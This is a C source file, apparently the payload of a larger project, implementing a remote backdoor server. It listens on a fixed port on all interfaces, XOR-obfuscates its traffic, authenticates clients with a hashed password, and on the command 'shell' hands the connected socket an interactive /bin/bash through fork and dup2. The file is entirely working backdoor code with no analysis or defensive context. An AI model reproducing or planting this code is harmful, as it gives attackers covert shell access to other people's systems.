#include "payload.h"

#include <sys/select.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define SOCKET_ERROR -1

#include <stdio.h>

static unsigned long	hash_djb2(unsigned char *str)
{
	unsigned long	hash = 5381;
	int		c;

	while ((c = *str++))
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
	return (hash);
}

static void		decrypt_msg(char *str, const int len)
{
	int i = 0;

	while (i < len - 1)
	{
		str[i] ^= KEY;
		i++;
	}
}

static void		encrypt_msg(char *str, const int len)
{
	int i = 0;

	while (i < len - 1)
	{
		str[i] ^= KEY;
		i++;
	}
}

static int		write_client(const SOCKET sock, char *buffer, const int len)
{
	encrypt_msg(buffer, len);
	if (send(sock, buffer, len, 0) < 0)
		return (-1);
	return (0);
}

static void		ask_passwd(const SOCKET sock)
{
	char	str[] = "passwd:\n\0";

	write_client(sock, str, 9);
}

static void		send_shutdown(const SOCKET sock)
{
	char	str[] = "shutdown\0";

	write_client(sock, str, 9);
}

static void		send_in_shell(const SOCKET sock)
{
	char	str[] = "in_shell\0";

	write_client(sock, str, 9);
}

//static void		send_out_shell(const SOCKET sock)
//{
//	char	str[] = "out_shell\0";
//
//	write_client(sock, str, 9);
//}

static void		all_shutdown(client_t *client, const int len)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock != 0)
			send_shutdown(client[i].sock);
	}
}

static int		all_close(client_t *client, const int len)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock != 0)
			return (0);
	}
	return (1);
}

static int		read_client(const SOCKET sd, uint8_t *auth)
{
	char			buffer[MAXMSG];
	int			n;

	memset(buffer, '\0', MAXMSG);
	n = recv(sd, buffer, MAXMSG - 1, 0);
	decrypt_msg(buffer, n);
	if (buffer[n - 1] == '\n')
		buffer[n - 1] = '\0';
	if (n < 0)
		return (1);
	else if (n == 0)
		return (-1);
	else
	{
		if (*auth == 0)
		{
			if (PASSWD_HASH == hash_djb2((unsigned char*)buffer))
			{
				*auth = 1;
				return (0);
			}
			ask_passwd(sd);
			return (0);
		}
		if ((strcmp(buffer, "quit")) == 0)
			return (1);
		else if ((strcmp(buffer, "shell") == 0))
			return(2);
		return (0);
	}
	return (0);
}

static void		init_client(client_t *client, int len)
{
	for (int i = 0; i < len; i++)
	{
		client[i].auth = 0;
		client[i].sock = 0;
		client[i].shell = 0;
	}
}

static void		clear_client(client_t *client, const int i)
{
	if (client[i].sock > 0)
		close(client[i].sock);
	client[i].sock = 0;
	client[i].auth = 0;
}

static void		clear_clients(client_t *client, const int len)
{
	for (int i = 0; i < len; i++)
		clear_client(client, i);
}

static int		get_max(client_t *client, const int len, const SOCKET srv)
{
	int max = srv;

	for (int i = 0; i < len; i++)
	{
		if (client[i].sock > max)
			max = client[i].sock;
	}
	return (max);
}

static void		add_sock_client(client_t *client, const int len, const SOCKET sock)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock == 0)
		{
			client[i].sock = sock;
			return;
		}
	}
}

static int		get_client_by_sock(client_t *client, const int len, const SOCKET sock)
{
	for (int i = 0; i < len; i++)
	{
		if (client[i].sock == sock)
		return (i);
	}
	return (0);
}

static void		init_start_shell(client_connect_t *client_connect, const SOCKET sock)
{
	FD_CLR(sock, &(client_connect->active_fd));
	client_connect->client[get_client_by_sock(client_connect->client, MAXCLIENT, sock)].shell = 1;
}

static int		start_shell(const SOCKET sock)
{
	pid_t		pid;

	pid = fork();
	if (pid < 0)
		return (1);
	if (pid == 0)
	{
		if ((dup2(sock, STDIN_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((dup2(sock, STDOUT_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((dup2(sock, STDERR_FILENO)) < 0)
			exit (EXIT_FAILURE);
		if ((execl("/bin/bash", "", NULL)) < 0)
			exit (EXIT_FAILURE);
	}
	return (0);
}

int			run_server(const SOCKET *sock)
{
	struct sockaddr_in	info_client;
	fd_set			readfds;
	socklen_t		size;
	int			new_client;
	int			index_client;
	int			nb_client;
	int			in_close;
	int			ret;
	int			max;
	client_connect_t	client_connect;

	nb_client = 0;
	in_close = 0;
	init_client(client_connect.client, MAXCLIENT);
	size = sizeof(info_client);
	FD_ZERO(&client_connect.active_fd);
	FD_SET(*sock, &client_connect.active_fd);
	while (1)
	{
		max = get_max(client_connect.client, MAXCLIENT, *sock);
		readfds = client_connect.active_fd;
		if (select(max + 1, &readfds, NULL, NULL, NULL) < 0)
			goto err;
		for (int i = 0; i < max + 1; i++)
		{
			if (FD_ISSET(i, &readfds))
			{
				if (i == *sock)
				{
					if ((new_client = accept(*sock, (struct sockaddr*)&info_client, &size)) < 0)
						goto err;
					if (nb_client < MAXCLIENT && in_close == 0)
					{
						FD_SET(new_client, &client_connect.active_fd);
						nb_client++;
						add_sock_client(client_connect.client, MAXCLIENT, new_client);
						ask_passwd(new_client);
					}
					else
						close(new_client);
				}
				else
				{
					index_client = get_client_by_sock(client_connect.client, MAXCLIENT, i);
					ret = read_client(i, &(client_connect.client[index_client]).auth);
					if (ret < 0)
					{
						FD_CLR(i, &client_connect.active_fd);
						nb_client--;
						clear_client(client_connect.client, index_client);
					}
					else if (ret == 1)
					{
						in_close = 1;
						all_shutdown(client_connect.client, MAXCLIENT);
					}
					else if (ret == 2)
					{
						init_start_shell(&client_connect, i);
						send_in_shell(i);
						start_shell(i);
					}
				}
			}
		}
		if (in_close == 1 && (all_close(client_connect.client, MAXCLIENT)) == 1)
		{
			clear_clients(client_connect.client, MAXCLIENT);
			close(*sock);
			return (0);
		}
	}
	return (0);
err:
	clear_clients(client_connect.client, MAXCLIENT);
	close(*sock);
	return (-1);
}

int			create_server()
{
	SOCKET			sock;
	struct sockaddr_in	sin;

	sock = 0;
	memset(&sin, 0, sizeof(sin));
	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
		return (-1);
	sin.sin_addr.s_addr = htonl(INADDR_ANY);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(SRV_PORT);
	if ((bind(sock, (struct sockaddr*)&sin, sizeof(sin))) != SOCKET_ERROR)
		if ((listen(sock, 5)) != SOCKET_ERROR)
			return sock;
	close(sock);
	return (-1);
}

